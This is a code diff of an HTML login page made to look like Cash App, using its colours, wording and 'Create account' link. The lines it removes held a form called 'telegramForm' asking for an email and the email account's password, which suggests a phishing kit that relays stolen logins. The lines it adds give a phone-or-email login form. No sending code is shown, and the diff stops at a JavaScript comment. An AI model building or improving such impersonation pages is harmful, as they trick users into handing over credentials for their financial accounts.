@@ -1,63 +1,125 @@
 <body
-  class="bg-[#00D64C] min-h-screen flex items-center justify-center"
+  class="bg-[#00D64C] mt-[51px] min-h-screen flex items-center justify-center"
   style="font-family: 'Helvetica', sans-serif;"
 >
   <div class="bg-white w-full max-w-lg py-16 px-8 rounded-3xl shadow-lg">
-    <h1 class="text-4xl font-semibold mb-2">Confirme su correo electrónico</h1>
-    <p class="text-gray-600 mb-10">
+    <h1 class="text-4xl text-[#333333] font-semibold mb-2">Log in</h1>
+    <p class="text-[#333333] mb-10">
       Enter your phone number or email. New to Cash App?
       <br />
       <a href="#" class="text-[#00D64C] font-medium">Create account</a>
     </p>
 
-    <!-- Form -->
-    <form id="telegramForm">
-      <!-- Email Input -->
-      <div class="mb-4">
-        <label for="email" class="block text-sm font-medium text-gray-600">
-          Email
-        </label>
-        <input
-          type="email"
-          id="email"
-          name="email"
-          placeholder="Your email address"
-          class="w-full px-6 py-3 mt-2 border border-gray-300 bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
-          required
-        />
-      </div>
-
-      <!-- Password Input -->
-      <div class="mb-16">
-        <label for="password" class="block text-sm font-medium text-gray-600">
-          Contraseña
-        </label>
-        <input
-          type="password"
-          id="password"
-          name="password"
-          placeholder="Email password"
-          class="w-full px-6 py-3 mt-2 border border-gray-300 bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
-          required
-        />
-      </div>
-
-      <!-- Buttons -->
-      <div class="flex justify-between gap-4">
+   <!-- Form Container -->
+   <div id="formContainer">
+    <!-- Mobile Number Form -->
+    <div id="mobileForm">
+      <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">
+        Mobile number
+      </label>
+      <div
+        class="flex items-center w-full px-4 py-2 border border-gray-300 bg-gray-100 rounded-xl"
+      >
+        <!-- SVG Flag -->
+        <div class="flex items-center justify-center w-8 h-5 overflow-hidden rounded">
+          <img
+            id="flagIcon"
+            src="/icons/uk.svg"
+            alt="Flag"
+            class="w-full h-full object-cover"
+          />
+        </div>
+    
+        <!-- Country Code -->
+        <span
+          id="countryCode"
+          class="ml-2 font-semibold text-gray-800"
+        >
+          +44
+        </span>
+    
+        <!-- Dropdown Icon -->
         <button
           type="button"
-          class="w-1/2 py-2 border font-bold border-gray-300 rounded-full text-gray-600 hover:bg-gray-100"
+          class="flex items-center ml-2 text-green-500 focus:outline-none"
         >
-          Use phone
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            class="h-4 w-4"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path d="M6 9l6 6 6-6"></path>
+          </svg>
         </button>
-        <button
-          type="submit"
-          class="w-1/2 py-2 bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
-        >
-          Continue
-        </button>
+    
+        <!-- Input Field -->
+        <input
+          type="text"
+          id="phone"
+          name="phone"
+          placeholder="1234 567890"
+          class="flex-grow pl-4 bg-transparent text-gray-800 placeholder-gray-500 focus:outline-none"
+        />
       </div>
-    </form>
+    </div>
+    
+
+    <!-- Email Form (Hidden by Default) -->
+    <div id="emailForm" class="hidden">
+      <label for="email" class="block text-sm font-medium text-gray-600">
+        Email
+      </label>
+      <input
+        type="email"
+        id="email"
+        name="email"
+        placeholder="Your email address"
+        class="w-full px-6 py-3 mt-2 border border-[#00D64C] bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
+      />
+    </div>
+
+    <!-- Buttons -->
+    <div class="flex justify-between gap-4 mt-6">
+      <button
+        id="toggleButton"
+        type="button"
+        class="w-1/2 py-2 border font-bold border-gray-300 rounded-full text-gray-600 hover:bg-gray-100"
+      >
+        Use email
+      </button>
+      <button
+        type="submit"
+        class="w-1/2 py-2 bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
+      >
+        Continue
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Obtener elementos del DOM
+  const toggleButton = document.getElementById("toggleButton");
+  const mobileForm = document.getElementById("mobileForm");
+  const emailForm = document.getElementById("emailForm");
+
+  // Función para alternar entre formularios
+  toggleButton.addEventListener("click", () => {
+    // Alternar la visibilidad de los formularios
+    mobileForm.classList.toggle("hidden");
+    emailForm.classList.toggle("hidden");
+
+    // Cambiar el texto del botón dinámicamente
+    toggleButton.textContent =
+      mobileForm.classList.contains("hidden") ? "Use phone" : "Use email";
+  });
+</script>
+
   </div>
 
   <!-- JavaScript -->
